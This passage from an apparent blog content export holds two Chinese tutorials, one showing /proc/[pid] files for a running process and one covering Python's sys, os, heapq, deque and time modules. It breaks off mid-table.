timerslack_ns<br>comm             gid_map  mountstats  personality    stack         uid_map<br>coredump_filter  io       net         projid_map     stat          wchan</li>\n</ul>\n<p>[1]+  Stopped                 cat -</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/maps</span><br><span class=\"line\"></span><br><span class=\"line\">这个文件大概是最常用的，用于显示进程的内存区域映射信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ cat /proc/2865/maps<br>5580631c6000-5580631ce000 r-xp 00000000 08:01 4981196                    /usr/bin/cat<br>5580633cd000-5580633ce000 r–p 00007000 08:01 4981196                    /usr/bin/cat<br>5580633ce000-5580633cf000 rw-p 00008000 08:01 4981196                    /usr/bin/cat<br>558063c7d000-558063c9e000 rw-p 00000000 00:00 0                          [heap]<br>7f6301cd7000-7f6302027000 r–p 00000000 08:01 4993768                    /usr/lib/locale/locale-archive<br>7f6302027000-7f63021d5000 r-xp 00000000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63021d5000-7f63023d5000 —p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023d5000-7f63023d9000 r–p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023d9000-7f63023db000 rw-p 001b2000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023db000-7f63023df000 rw-p 00000000 00:00 0<br>7f63023df000-7f6302404000 r-xp 00000000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f63025c1000-7f63025c3000 rw-p 00000000 00:00 0<br>7f63025e1000-7f6302603000 rw-p 00000000 00:00 0<br>7f6302603000-7f6302604000 r–p 00024000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f6302604000-7f6302605000 rw-p 00025000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f6302605000-7f6302606000 rw-p 00000000 00:00 0<br>7fff2ab81000-7fff2aba2000 rw-p 00000000 00:00 0                          [stack]<br>7fff2abef000-7fff2abf2000 r–p 00000000 00:00 0                          [vvar]<br>7fff2abf2000-7fff2abf4000 r-xp 00000000 00:00 0                          [vdso]<br>ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/stack</span><br><span class=\"line\"></span><br><span class=\"line\">这个文件表示当前进程的内核调用栈信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ sudo cat /proc/2865/stack<br>[<ffffffffa008d05e>] do_signal_stop+0xae/0x1f0<br>[<ffffffffa008e50c>] get_signal+0x18c/0x5a0<br>[<ffffffffa002ac26>] do_signal+0x36/0x610<br>[<ffffffffa0003019>] exit_to_usermode_loop+0x69/0xa0<br>[<ffffffffa00038eb>] syscall_return_slowpath+0x9b/0xb0<br>[<ffffffffa06926e4>] entry_SYSCALL_64_fastpath+0x7b/0x7d<br>[<ffffffffffffffff>] 0xffffffffffffffff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/auxv</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了传递给进程的解释器信息，即 auxv(AUXiliary Vector)，每一项都是由一个 unsigned long 长度的 ID 加上一个 unsigned long 长度的值构成：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ xxd -e -g8 /proc/2865/auxv<br>00000000: 0000000000000021 00007fff2abf2000  !…….. .<em>….<br>00000010: 0000000000000010 00000000bfebfbff  …………….<br>00000020: 0000000000000006 0000000000001000  …………….<br>00000030: 0000000000000011 0000000000000064  ……..d…….<br>00000040: 0000000000000003 00005580631c6040  ........@`.c.U..<br>00000050: 0000000000000004 0000000000000038  ……..8…….<br>00000060: 0000000000000005 0000000000000009  …………….<br>00000070: 0000000000000007 00007f63023df000  ……….=.c…<br>00000080: 0000000000000008 0000000000000000  …………….<br>00000090: 0000000000000009 00005580631c8290  ………..c.U..<br>000000a0: 000000000000000b 00000000000003e8  …………….<br>000000b0: 000000000000000c 00000000000003e8  …………….<br>000000c0: 000000000000000d 00000000000003e8  …………….<br>000000d0: 000000000000000e 00000000000003e8  …………….<br>000000e0: 0000000000000017 0000000000000000  …………….<br>000000f0: 0000000000000019 00007fff2ab9ff39  ……..9..</em>….<br>00000100: 000000000000001a 0000000000000000  …………….<br>00000110: 000000000000001f 00007fff2aba1feb  ………..<em>….<br>00000120: 000000000000000f 00007fff2ab9ff49  ……..I..</em>….<br>00000130: 0000000000000000 0000000000000000  …………….</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">每个值具体是做什么的，可以用下面的办法显示出来，对比看一看，更详细的可以查看 `/usr/include/elf.h` 和 `man ld.so`：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ LD_SHOW_AUXV=1 cat -<br>AT_SYSINFO_EHDR: 0x7fff6afb3000<br>AT_HWCAP:        bfebfbff<br>AT_PAGESZ:       4096<br>AT_CLKTCK:       100<br>AT_PHDR:         0x557b68217040<br>AT_PHENT:        56<br>AT_PHNUM:        9<br>AT_BASE:         0x7f41e5689000<br>AT_FLAGS:        0x0<br>AT_ENTRY:        0x557b68219290<br>AT_UID:          1000<br>AT_EUID:         1000<br>AT_GID:          1000<br>AT_EGID:         1000<br>AT_SECURE:       0<br>AT_RANDOM:       0x7fff6aedc0a9<br>AT_HWCAP2:       0x0<br>AT_EXECFN:       /usr/bin/cat<br>AT_PLATFORM:     x86_64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">值得一提的是，`AT_SYSINFO_EHDR` 所对应的值是一个叫做的 VDSO(Virtual Dynamic Shared Object) 的地址。在 ret2vdso 漏洞利用方法中会用到（参考章节6.1.6）。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/environ</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程的环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ strings /proc/2865/environ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/fd</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程打开文件的情况：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ ls -al /proc/2865/fd<br>total 0<br>dr-x—— 2 firmy firmy  0 12月 30 11:13 .<br>dr-xr-xr-x 9 firmy firmy  0 12月 30 11:13 ..<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 0 -&gt; /dev/pts/2<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 1 -&gt; /dev/pts/2<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 2 -&gt; /dev/pts/2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/status[¶](http://study.ctfcaict.com/media/course/html/3/863846a6-3305-4770-9bb5-ecaa12171a2e.html#procpidstatus)</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程的状态信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ cat /proc/2865/status<br>Name:   cat<br>Umask:  0022<br>State:  T (stopped)<br>Tgid:   2865<br>Ngid:   0<br>Pid:    2865<br>PPid:   2059<br>TracerPid:      0<br>Uid:    1000    1000    1000    1000<br>Gid:    1000    1000    1000    1000<br>FDSize: 256<br>Groups: 3 7 10 56 90 91 93 95 96 98 1000<br>NStgid: 2865<br>NSpid:  2865<br>NSpgid: 2865<br>NSsid:  2059<br>VmPeak:     7828 kB<br>VmSize:     7828 kB<br>VmLck:         0 kB<br>VmPin:         0 kB<br>VmHWM:       788 kB<br>VmRSS:       788 kB<br>RssAnon:              64 kB<br>RssFile:             724 kB<br>RssShmem:              0 kB<br>VmData:      312 kB<br>VmStk:       132 kB<br>VmExe:        32 kB<br>VmLib:      1876 kB<br>VmPTE:        40 kB<br>VmPMD:        12 kB<br>VmSwap:        0 kB<br>HugetlbPages:          0 kB<br>Threads:        1<br>SigQ:   2/47723<br>SigPnd: 0000000000000000<br>ShdPnd: 0000000000000000<br>SigBlk: 0000000000000000<br>SigIgn: 0000000000000000<br>SigCgt: 0000000000000000<br>CapInh: 0000000000000000<br>CapPrm: 0000000000000000<br>CapEff: 0000000000000000<br>CapBnd: 0000003fffffffff<br>CapAmb: 0000000000000000<br>NoNewPrivs:     0<br>Seccomp:        0<br>Cpus_allowed:   ff<br>Cpus_allowed_list:      0-7<br>Mems_allowed:   00000001<br>Mems_allowed_list:      0<br>voluntary_ctxt_switches:        1<br>nonvoluntary_ctxt_switches:     0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/syscall</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程正在执行的系统调用：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ sudo cat /proc/2865/syscall<br>0 0x0 0x7f63025e2000 0x20000 0x22 0xffffffffffffffff 0x0 0x7fff2ab9f958 0x7f630210ea11</p>\n<p>```</p>\n<p>第一个值是系统调用号，后面跟着是六个参数，最后两个值分别是堆栈指针和指令计数器的值。</p>\n"},{"title":"每日学说话(●'◡'●)python-常用模块","_content":"\n### sys模块\n\n####  python之sys模块详解\n\nsys模块功能多，我们这里介绍一些比较实用的功能，相信你会喜欢的，和我一起走进python的模块吧！\n\n#### sys模块的常见函数列表\n\n- `sys.argv`: 实现从程序外部向程序传递参数。\n- `sys.exit([arg])`: 程序中间的退出，arg=0为正常退出。\n- `sys.getdefaultencoding()`: 获取系统当前编码，一般默认为ascii。\n- `sys.setdefaultencoding()`: 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding('utf8')，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）\n- `sys.getfilesystemencoding()`: 获取文件系统使用编码方式，Windows下返回'mbcs'，mac下返回'utf-8'.\n- `sys.path`: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。\n- `sys.platform`: 获取当前系统平台。\n- `sys.stdin,sys.stdout,sys.stderr`: stdin , stdout ,  以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的.  你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们\n\n#### sys.argv\n\n功能：在外部向程序内部传递参数\n 示例：`sys.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\nprint sys.argv[0]\nprint sys.argv[1]\n```\n\n运行：\n\n```python\n# python sys.py argv1\nsys.py\nargv1\n```\n\n自己动手尝试一下，领悟参数对应关系\n\n#### sys.exit(n)\n\n功能：执行到主程序末尾，解释器自动退出，但是如果需要中途退出程序，可以调用sys.exit函数，带有一个可选的整数参数返回给调用它的程序，表示你可以在主程序中捕获对sys.exit的调用。（0是正常退出，其他为异常）\n\n示例：`exit.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\n\ndef exitfunc(value):\n\tprint value\n\tsys.exit(0)\n\nprint \"hello\"\n\ntry:\n\tsys.exit(1)\nexcept SystemExit,value:\n\texitfunc(value)\n\nprint \"come?\"\n```\n\n运行：\n\n```python\n# python exit.py\nhello\n1\n```\n\n#### sys.path\n\n功能：获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。\n\n示例：\n\n```python\n>>> import sys\n>>> sys.path\n['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/python2.7/dist-packages/ubuntu-sso-client']\nsys.path.append(\"自定义模块路径\")\n```\n\n#### sys.modules\n\n功能：`sys.modules`是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，`sys.modules`将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。它拥有字典所拥有的一切方法。\n\n示例：`modules.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\n\nprint sys.modules.keys()\n\nprint sys.modules.values()\n\nprint sys.modules[\"os\"]\n```\n\n运行：\n\n```python\npython modules.py\n['copy_reg', 'sre_compile', '_sre', 'encodings', 'site', '__builtin__',......\n```\n\n#### sys.stdin\\stdout\\stderr\n\n功能：stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print  不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ),  或者以非标准的方式处理它们\n\n勿忘初心，放得始终 (ง •_•)ง！\n\n### os模块\n\n```python\nimport os\nos.sep:取代操作系统特定的路径分隔符\nos.name:指示你正在使用的工作平台。比如对于Windows，它是'nt'，而对于Linux/Unix用户，它是'posix'。\nos.getcwd:得到当前工作目录，即当前python脚本工作的目录路径。\nos.getenv()和os.putenv:分别用来读取和设置环境变量\nos.listdir():返回指定目录下的所有文件和目录名\nos.remove(file):删除一个文件\nos.stat（file）:获得文件属性\nos.chmod(file):修改文件权限和时间戳\nos.mkdir(name):创建目录\nos.rmdir(name):删除目录\nos.removedirs（r“c：\\python”）:删除多个目录\nos.system():运行shell命令\nos.exit():终止当前进程\nos.linesep:给出当前平台的行终止符。例如，Windows使用'\\r\\n'，Linux使用'\\n'而Mac使用'\\r'\nos.path.split():返回一个路径的目录名和文件名\nos.path.isfile()和os.path.isdir()分别检验给出的路径是一个目录还是文件\nos.path.existe():检验给出的路径是否真的存在\nos.listdir(dirname):列出dirname下的目录和文件\nos.getcwd():获得当前工作目录\nos.curdir:返回当前目录（'.'）\nos.chdir(dirname):改变工作目录到dirname\nos.path.isdir(name):判断name是不是目录，不是目录就返回false\nos.path.isfile(name):判断name这个文件是否存在，不存在返回false\nos.path.exists(name):判断是否存在文件或目录name\nos.path.getsize(name):或得文件大小，如果name是目录返回0L\nos.path.abspath(name):获得绝对路径\nos.path.isabs():判断是否为绝对路径\nos.path.normpath(path):规范path字符串形式\nos.path.split(name):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）\nos.path.splitext():分离文件名和扩展名\nos.path.join(path,name):连接目录与文件名或目录\nos.path.basename(path):返回文件名\nos.path.dirname(path):返回文件路径\n```\n\n文件操作：\n\n```python\nos.mknod(\"text.txt\")：创建空文件\nfp = open(\"text.txt\",w):直接打开一个文件，如果文件不存在就创建文件\n```\n\nopen 模式：\n\n```\nw 写方式\na 追加模式打开（从EOF开始，必要时创建新文件）\nr+ 以读写模式打开\nw+ 以读写模式打开\na+ 以读写模式打开\nrb 以二进制读模式打开\nwb 以二进制写模式打开 (参见 w )\nab 以二进制追加模式打开 (参见 a )\nrb+ 以二进制读写模式打开 (参见 r+ )\nwb+ 以二进制读写模式打开 (参见 w+ )\nab+ 以二进制读写模式打开 (参见 a+ )\n```\n\n```python\nfp.read([size])  #size为读取的长度，以byte为单位\n \nfp.readline([size])  #读一行，如果定义了size，有可能返回的只是一行的一部分\n \nfp.readlines([size])  #把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。\n \nfp.write(str)  #把str写到文件中，write()并不会在str后加上一个换行符\n \nfp.writelines(seq)  #把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。\n \nfp.close()  #关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError\n \nfp.flush()  #把缓冲区的内容写入硬盘\n \nfp.fileno()  #返回一个长整型的”文件标签“\n \nfp.isatty()  #文件是否是一个终端设备文件（unix系统中的）\n \nfp.tell()  #返回文件操作标记的当前位置，以文件的开头为原点\n \nfp.next()  #返回下一行，并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时，就是调用next()函数来实现遍历的。\n \nfp.seek(offset[,whence])  #将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为0表示从头开始计算，1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。\n \nfp.truncate([size])  #把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用0把文件补到相应的大小，也可能是以一些随机的内容加上去。\n \n目录操作\n \nos.mkdir(\"file\")　　创建目录\n \nshutil.copyfile(\"oldfile\",\"newfile\")　　复制文件:oldfile和newfile都只能是文件\n \nshutil.copy(\"oldfile\",\"newfile\")  oldfile只能是文件夹，newfile可以是文件，也可以是目标目录\n \nshutil.copytree(\"olddir\",\"newdir\")  复制文件夹.olddir和newdir都只能是目录，且newdir必须不存在\n \nos.rename(\"oldname\",\"newname\")  重命名文件（目录）.文件或目录都是使用这条命令\n \nshutil.move(\"oldpos\",\"newpos\")  移动文件（目录）\n \nos.rmdir(\"dir\")  只能删除空目录\n \nshutil.rmtree(\"dir\")  空目录、有内容的目录都可以删\n \nos.chdir(\"path\")  转换目录，换路径\n```\n\n### 集合、堆和双端队列(heap模块、deque类)\n\n集合(set)、堆(heap)、双端队列(deque)\n\n#### 堆导入 heapq 模块、双端队列导入collections模块。\n\n| 函数                    | 描述                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| heappush(heap,value)    | 将value加入堆                                                |\n| heappop(heap)           | 将堆中的最小值弹出，并返回该最小值                           |\n| heapify(heap)           | 将列表转换为堆，也就是重新安排列表中元素的顺序               |\n| heapreplace(heap,value) | 将堆中的最小值弹出，并同时将value入堆                        |\n| nlargest(n,iter)        | 返回可迭代对象中前n个最大值，以列表形式返回                  |\n| nsmallest(n,iter)       | 返回可迭代对象中前n个最小值，以列表形式返回                  |\n| merge(*iter,key)        | 合并多个有序的迭代对象，如果指定key，则对每个元素的排序会利用key指定的函数 |\n\n```python\nfrom collections import deque\n```\n\ncollections 是 python 内建的一个集合模块，里面封装了许多集合类，其中队列相关的集合只有一个：deque。\ndeque 是双边队列（double-ended queue），具有队列和栈的性质，在 list 的基础上增加了移动、旋转和增删等。\n\n```python\nd = collections.deque([])\nd.append('a') # 在最右边添加一个元素，此时 d=deque('a')\nd.appendleft('b') # 在最左边添加一个元素，此时 d=deque(['b', 'a'])\nd.extend(['c','d']) # 在最右边添加所有元素，此时 d=deque(['b', 'a', 'c', 'd'])\nd.extendleft(['e','f']) # 在最左边添加所有元素，此时 d=deque(['f', 'e', 'b', 'a', 'c', 'd'])\nd.pop() # 将最右边的元素取出，返回 'd'，此时 d=deque(['f', 'e', 'b', 'a', 'c'])\nd.popleft() # 将最左边的元素取出，返回 'f'，此时 d=deque(['e', 'b', 'a', 'c'])\nd.rotate(-2) # 向左旋转两个位置（正数则向右旋转），此时 d=deque(['a', 'c', 'e', 'b'])\nd.count('a') # 队列中'a'的个数，返回 1\nd.remove('c') # 从队列中将'c'删除，此时 d=deque(['a', 'e', 'b'])\nd.reverse() # 将队列倒序，此时 d=deque(['b', 'e', 'a'])\n```\n\n使用deque解决约瑟夫问题：\n\n```python\n\"\"\" 约瑟夫算法\n据说著名犹太历史学家 Josephus 有过以下的故事：\n在罗马人占领桥塔帕特后，39个犹太人与 Josephus 及他的朋友躲到一个洞中，\n39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式，41个人排成一个圆圈，\n由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，\n直到所有人都自杀身亡为止。然而 Josephus 和他的朋友并不想自杀，\n问他俩安排的哪两个位置可以逃过这场死亡游戏？\n\"\"\"\nimport collections\ndef ysf(a, b):\n    d = collections.deque(range(1, a+1)) # 将每个人依次编号，放入到队列中\n    while d:\n        d.rotate(-b) # 队列向左旋转b步\n        print(d.pop()) # 将最右边的删除，即自杀的人\n\nif __name__ == '__main__':\n    ysf(41,3) # 输出的是自杀的顺序。最后两个是16和31，说明这两个位置可以保证他俩的安全。\n```\n\n###  time模块\n\ntime 模块主要包含各种提供日期、时间功能的类和函数。该模块既提供了把日期、时间格式化为字符串的功能，也提供了从字符串恢复日期、时间的功能。\n\n在 Python 的交互式解释器中先导入 time 模块，然后输入 [e for e in dir(time) if not e.startswith('_')] 命令，即可看到该模块所包含的全部属性和函数：\n\n```python\n>>> [e for e in dir(time) if not e.startswith('_')]\n['altzone', 'asctime', 'clock', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', \n'monotonic',\n 'perf_counter', 'process_time', 'sleep', 'strftime', 'strptime', 'struct_time', 'time', 'timezone', 'tzname']\n```\n\n在 time 模块内提供了一个 time.struct_time 类，该类代表一个时间对象，它主要包含 9 个属性，每个属性的信息如下表所示：\n\n| 字段名   | 字段含义     | 值                      |\n| -------- | ------------ | ----------------------- |\n| tm_year  | 年           | 如 2017、2018 等        |\n| tm_mon   | 月           | 如 2、3 等，范围为 1~12 |\n| tm_mday  | 日           | 如 2、3 等，范围为 1~31 |\n| tm_hour  | 时           | 如 2、3 等，范围为 0~23 |\n| tm_min   | 分           | 如 2、3 等，范围为 0~59 |\n| tm_sec   | 秒           | 如 2、3 等，范围为 0~59 |\n| tm_wday  | 周           | 周一为 0，范围为 0~6    |\n| tm_yday  | 一年内第几天 | 如 65，范围 1~366       |\n| tm_isdst | 夏时令       | 0、1 或 -1              |\n\n比如，Python 可以用 time.struct_time(tm_year=2018, tm_mon=5, tm_mday=2, tm_hour=8,  tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0) 很清晰地代表时间。\n\n此外，Python 还可以用一个包含 9 个元素的元组来代表时间，该元组的 9 个元素和 struct_time 对象中 9 个属性的含义是一一对应的。比如程序可以使用（2018, 5, 2, 8, 0, 30, 3, 1, 0）来代表时间。\n\n在日期、时间模块内常用的功能函数如下：\n\ntime.asctime([t])：将时间元组或 struct_time 转换为时间字符串。如果不指定参数 t，则默认转换当前时间。\n\ntime.ctime([secs])：将以秒数代表的时间转换为时间宇符串。\n\ntime.gmtime([secs])：将以秒数代表的时间转换为 struct_time 对象。如果不传入参数，则使用当前时间。\n\ntime.localtime([secs])：将以秒数代表的时间转换为代表当前时间的 struct_time 对象。如果不传入参数，则使用当前时间。\n\ntime.mktime(t)：它是 localtime 的反转函数，用于将 struct_time 对象或元组代表的时间转换为从 1970 年 1 月 1 日 0 点整到现在过了多少秒。\n\ntime.perf_counter()：返回性能计数器的值。以秒为单位。\n\ntime.process_time()：返回当前进程使用 CPU 的时间。以秒为单位。\n\ntime.sleep(secs)：暂停 secs 秒，什么都不干。\n\ntime.strftime(format[, t])：将时间元组或 struct_time 对象格式化为指定格式的时间字符串。如果不指定参数 t，则默认转换当前时间。\n\ntime.strptime(string[, format])：将字符串格式的时间解析成 struct_time 对象。\n\ntime.time()：返回从 1970 年 1 月 1 日 0 点整到现在过了多少秒。\n\ntime.timezone：返回本地时区的时间偏移，以秒为单位。\n\ntime.tzname：返回本地时区的名字。\n\n下面程序示范了 time 棋块的功能函数：\n\n```python\nimport time\n# 将当前时间转换为时间字符串\nprint(time.asctime())\n# 将指定时间转换时间字符串，时间元组的后面3个元素没有设置\nprint(time.asctime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # Mon Feb  4 11:08:23 2018\n# 将以秒数为代表的时间转换为时间字符串\nprint(time.ctime(30)) # Thu Jan  1 08:00:30 1970\n# 将以秒数为代表的时间转换为struct_time对象。\nprint(time.gmtime(30))\n# 将当前时间转换为struct_time对象。\nprint(time.gmtime())\n# 将以秒数为代表的时间转换为代表当前时间的struct_time对象\nprint(time.localtime(30))\n# 将元组格式的时间转换为秒数代表的时间\nprint(time.mktime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # 1517713703.0\n# 返回性能计数器的值\nprint(time.perf_counter())\n# 返回当前进程使用CPU的时间\nprint(time.process_time())\n#time.sleep(10)\n# 将当前时间转换为指定格式的字符串\nprint(time.strftime('%Y-%m-%d %H:%M:%S'))\nst = '2018年3月20日'\n# 将指定时间字符串恢复成struct_time对象。\nprint(time.strptime(st, '%Y年%m月%d日'))\n# 返回从1970年1970年1月1日0点整到现在过了多少秒。\nprint(time.time())\n# 返回本地时区的时间偏移，以秒为单位\nprint(time.timezone) # 在国内东八区输出-28800\n```\n\n运行上面程序，可以看到如下输出结果：\n\n```python\nFri Feb 22 11:28:39 2019\nMon Feb  4 11:08:23 2018\nThu Jan  1 08:00:30 1970\ntime.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=0, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, \ntm_isdst=0)\ntime.struct_time(tm_year=2019, tm_mon=2, tm_mday=22, tm_hour=3, tm_min=28, tm_sec=39, tm_wday=4, tm_yday=53, \ntm_isdst=0)\ntime.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=8, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, \ntm_isdst=0)\n1517713703.0\n0.0\n0.140625\n2019-02-22 11:28:39\ntime.struct_time(tm_year=2018, tm_mon=3, tm_mday=20, tm_hour=0, tm_min=0, tm_sec=0, tm_wday=1, tm_yday=79, \ntm_isdst=-1)\n1550806119.4960592\n-28800\n```\n\ntime 模块中的 strftime() 和 strptime() 两个函数互为逆函数，其中 strftime() 用于将 struct_time 对象或时间元组转换为时间字符串；而 strptime() 函数用于将时间字符串转换为 struct_time  对象。这两个函数都涉及编写格式模板，比如上面程序中使用 %Y 代表年、%m 代表月、%d 代表日、%H 代表时、%M 代表分、%S  代表秒。这两个函数所需要的时间格式字符串支持的指令如下表所示：\n\n| 指 令 | 含义                                                         |\n| ----- | ------------------------------------------------------------ |\n| %a    | 本地化的星期几的缩写名，比如 Sun 代表星期天                  |\n| %A    | 本地化的星期几的完整名                                       |\n| %b    | 本地化的月份的缩写名，比如 Jan 代表一月                      |\n| %B    | 本地化的月份的完整名                                         |\n| %c    | 本地化的日期和时间的表示形式                                 |\n| %d    | 代表一个月中第几天的数值，范固： 01~31                       |\n| %H    | 代表 24 小时制的小时，范围：00~23                            |\n| %I    | 代表 12 小时制的小时，范围：01~12                            |\n| %j    | 一年中第几天，范围：001~366                                  |\n| %m    | 代表月份的数值，范围：01~12                                  |\n| %M    | 代表分钟的数值，范围：00~59                                  |\n| %p    | 上午或下午的本地化方式。当使用 strptime() 函数并使用 %I 指令解析小时时，%p 只影响小时字段 |\n| %S    | 代表分钟的数值，范围：00~61。该范围确实是 00~61，60 在表示闰秒的时间戳时有效，而 61 则是由于一些历史原因造成的 |\n| %U    | 代表一年中表示第几周，以星期天为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期天被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效 |\n| %w    | 代表星期几的数值，范围：0~6，其中 0 代表周日                 |\n| %W    | 代表一年小第几周，以星期一为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期一被认为处于第一周。当使用 strptime() 